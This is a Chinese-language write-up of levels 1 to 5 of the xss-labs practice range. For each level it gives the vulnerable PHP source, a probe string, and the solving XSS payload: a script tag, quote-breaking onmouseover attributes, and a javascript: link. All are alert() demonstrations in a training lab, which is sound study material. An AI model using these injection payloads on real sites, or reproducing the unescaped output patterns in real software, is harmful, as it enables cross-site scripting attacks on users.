---
{"dg-publish":true,"title":"自建环境_xss-labs","dg-path":"安全/靶场/自建环境_xss-labs.md","permalink":"/安全/靶场/自建环境_xss-labs/","dgPassFrontmatter":true}
---


# Level 1



函数源代码：
```php
<?php
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

这一关没有什么过滤，它会将我们的name值在网页中输出，所以我们尝试注入：
```php
<script>alert(1)</script>
```



# Level 2

![Pasted image 20240826195628.png](/img/user/picture/Pasted%20image%2020240826195628.png)
先构造一个测试payload：
```html
'';!--"<XSS>=&{()}
```

ctrl+u查看源码：
![Pasted image 20240826195751.png](/img/user/picture/Pasted%20image%2020240826195751.png)

**发现标题双引号、尖括号、&符号被进行了转义**
而下面的输入框却没有过滤

函数源代码
```php
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
```

> [!NOTE] 注意
> `htmlspecialchars($str)` 是 PHP 中用来将字符串中的特殊字符转换为 HTML 实体的函数。
> - `&` 转换为 `&amp;`
>- `<` 转换为 `&lt;`
>- `>` 转换为 `&gt;`
>- `"` 转换为 `&quot;`
>- `'` 转换为 `&#039;`（这是在双引号内使用时）

所以我们可以尝试将输入框中的内容进行闭合
```html
"><script>alert(111)</script>"<
```


# Level 3(绕过htmlspecials()函数)

![Pasted image 20240826200044.png](/img/user/picture/Pasted%20image%2020240826200044.png)

依旧用测试payload看一下
```html
'';!--"<XSS>=&{()}
```
![Pasted image 20240826200114.png](/img/user/picture/Pasted%20image%2020240826200114.png)
完啦，现在输入框中的内容也被进行了转义

源代码：
```php
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
```

由于htmlspecialchars默认配置是**不过滤单引号**的，于是想到构造单引号的payload。

```html
'onmouseover='alert(1)
```
移动鼠标到输入框触发onmouseover事件，过关！


# Level 4
![Pasted image 20240826201105.png](/img/user/picture/Pasted%20image%2020240826201105.png)
先用测试代码看一下
```
'';!--"<XSS>=&{()}
```
![Pasted image 20240826201130.png](/img/user/picture/Pasted%20image%2020240826201130.png)
发现下面输入框过滤了我们的尖括号`<>`
所以我们可以调整一下第三题的payload，并且闭合双引号

```
"onmouseover='alert(1)'
```

# Level 5(绕过检测<script和on事件)
![Pasted image 20240826201331.png](/img/user/picture/Pasted%20image%2020240826201331.png)
测试payload看一下：
```
'';!--"<XSS>=&{()}
```

![Pasted image 20240826201442.png](/img/user/picture/Pasted%20image%2020240826201442.png)
发现好像啥也没少
用之前的payload测试一下：
```
"><script>alert("xss");</script>
```
![Pasted image 20240826201714.png](/img/user/picture/Pasted%20image%2020240826201714.png)

```
"onmouseover='alert(1)'
```
![Pasted image 20240826201759.png](/img/user/picture/Pasted%20image%2020240826201759.png)



这一题可以用javascript伪协议来实现
payload:
```
"><a href="javascript:alert(`xss`);">xss</a>
```



